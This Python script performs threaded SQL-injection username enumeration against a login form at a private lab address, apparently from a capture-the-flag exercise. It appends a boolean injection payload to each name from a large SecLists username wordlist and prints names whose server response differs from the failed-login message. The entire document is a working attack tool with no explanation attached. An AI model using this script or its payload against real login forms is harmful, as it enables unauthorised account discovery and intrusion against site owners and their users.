import requests
import urllib.parse
import threading

headers = {
    'Host': '10.10.128.197',
    # 'Content-Length': '21',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://10.10.128.197',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://10.10.128.197/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
}

def make_request(username):
    data = {
        'username': username + "' and 1=1 -- -",
        'password': 'password',
    }
    encoded = urllib.parse.urlencode(data)
    response = requests.post('http://10.10.128.197/', headers=headers, data=encoded, verify=False)
    if "Invalid username and password." not in response.text:
        print(username)

# Define the number of threads you want to use
num_threads = 16  # You can adjust this as needed

# Open the file and read usernames
with open('/home/splitunknown/Tools/SecLists/Usernames/xato-net-10-million-usernames.txt', 'r') as file:
    usernames = [line.strip() for line in file.readlines()]

# Split usernames into chunks for each thread
chunk_size = len(usernames) // num_threads
chunks = [usernames[i:i + chunk_size] for i in range(0, len(usernames), chunk_size)]
print(chunk_size)

# Create and start thread objects
threads = []
for chunk in chunks:
    thread = threading.Thread(target=lambda usernames=chunk: [make_request(username) for username in usernames])
    threads.append(thread)
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()
